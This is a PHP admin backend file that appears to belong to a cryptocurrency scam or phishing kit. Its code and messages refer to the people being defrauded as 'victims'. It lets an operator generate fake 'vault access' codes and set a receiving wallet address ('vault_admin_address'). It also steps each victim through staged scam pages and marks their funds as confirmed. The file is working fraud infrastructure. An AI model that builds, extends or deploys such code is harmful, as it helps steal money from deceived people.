<?php
session_start();
require_once 'db_connection.php';

// Check if admin is logged in
if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    http_response_code(401);
    echo json_encode(['success' => false, 'message' => 'Unauthorized']);
    exit();
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'message' => 'Method not allowed']);
    exit();
}

$action = $_POST['action'] ?? '';
$token = $_POST['token'] ?? '';

if (empty($action) || empty($token)) {
    echo json_encode(['success' => false, 'message' => 'Missing required parameters']);
    exit();
}

switch ($action) {
    case 'generate_code':
        generateAccessCode($conn, $token);
        break;
    
    case 'set_address':
        setAdminAddress($conn, $token, $_POST['address'] ?? '');
        break;
    
    case 'force_next':
        forceNextStep($conn, $token);
        break;
    
    case 'next_step':
        forceNextStep($conn, $token);
        break;
    
    case 'confirm_funds':
        confirmFunds($conn, $token);
        break;
    
    default:
        echo json_encode(['success' => false, 'message' => 'Invalid action']);
        break;
}

function generateAccessCode($conn, $token) {
    // Generate 6-digit code
    $code = str_pad(rand(0, 999999), 6, '0', STR_PAD_LEFT);
    
    // Check if victim exists
    $stmt = $conn->prepare("SELECT id FROM user_submissions WHERE token = ?");
    $stmt->bind_param("s", $token);
    $stmt->execute();
    $result = $stmt->get_result();
    
    if ($result->num_rows === 0) {
        echo json_encode(['success' => false, 'message' => 'Victim not found']);
        return;
    }
    $stmt->close();
    
    // Update victim with access code and activity
    $stmt = $conn->prepare("UPDATE user_submissions SET vault_code = ?, vault_code_generated = NOW(), vault_status = 'VaultCodeGenerated', activity = 'VaultCodeGenerated' WHERE token = ?");
    $stmt->bind_param("ss", $code, $token);
    
    if ($stmt->execute()) {
        echo json_encode([
            'success' => true, 
            'code' => $code,
            'message' => 'Access code generated successfully'
        ]);
    } else {
        echo json_encode(['success' => false, 'message' => 'Failed to generate code']);
    }
    $stmt->close();
}

function setAdminAddress($conn, $token, $address) {
    if (empty($address)) {
        echo json_encode(['success' => false, 'message' => 'Address cannot be empty']);
        return;
    }
    
    // Basic address validation (you can enhance this)
    if (strlen($address) < 20) {
        echo json_encode(['success' => false, 'message' => 'Invalid address format']);
        return;
    }
    
    // Update admin address and set status to ready for vault access
    $stmt = $conn->prepare("UPDATE user_submissions SET vault_admin_address = ?, vault_status = 'AddressSet', activity = 'AddressSet' WHERE token = ?");
    $stmt->bind_param("ss", $address, $token);
    
    if ($stmt->execute()) {
        echo json_encode([
            'success' => true,
            'message' => 'Admin address set successfully'
        ]);
    } else {
        echo json_encode(['success' => false, 'message' => 'Failed to set address']);
    }
    $stmt->close();
}

function forceNextStep($conn, $token) {
    // Get current status
    $stmt = $conn->prepare("SELECT vault_status, activity, vault_code FROM user_submissions WHERE token = ?");
    $stmt->bind_param("s", $token);
    $stmt->execute();
    $result = $stmt->get_result();
    
    if ($result->num_rows === 0) {
        echo json_encode(['success' => false, 'message' => 'Victim not found']);
        return;
    }
    
    $victim = $result->fetch_assoc();
    $stmt->close();
    
    $currentStatus = $victim['vault_status'] ?: $victim['activity'];
    $nextStatus = '';
    
    // Determine next step
    switch ($currentStatus) {
        case 'VaultPage':
            $nextStatus = 'VaultCrypto';
            break;
        case 'VaultCrypto':
        case 'VaultCodeGenerated':
            $nextStatus = 'VaultAccess';
            break;
        case 'VaultAccess':
            $nextStatus = 'VaultWallet';
            break;
        case 'VaultWallet':
            $nextStatus = 'VaultComplete';
            break;
        case 'AddressSet':
            $nextStatus = 'VaultWallet';
            break;
        default:
            echo json_encode(['success' => false, 'message' => 'Cannot determine next step']);
            return;
    }
    
    // Update status and activity
    $stmt = $conn->prepare("UPDATE user_submissions SET vault_status = ?, activity = ? WHERE token = ?");
    $stmt->bind_param("sss", $nextStatus, $nextStatus, $token);
    
    if ($stmt->execute()) {
        echo json_encode([
            'success' => true,
            'message' => "Victim moved to: $nextStatus"
        ]);
    } else {
        echo json_encode(['success' => false, 'message' => 'Failed to update status']);
    }
    $stmt->close();
}

function confirmFunds($conn, $token) {
    // Update status to funds confirmed and complete
    $stmt = $conn->prepare("UPDATE user_submissions SET vault_status = 'VaultFundsConfirmed', activity = 'VaultFundsConfirmed' WHERE token = ?");
    $stmt->bind_param("s", $token);
    
    if ($stmt->execute()) {
        echo json_encode([
            'success' => true,
            'message' => 'Funds confirmed successfully'
        ]);
    } else {
        echo json_encode(['success' => false, 'message' => 'Failed to confirm funds']);
    }
    $stmt->close();
}
?> 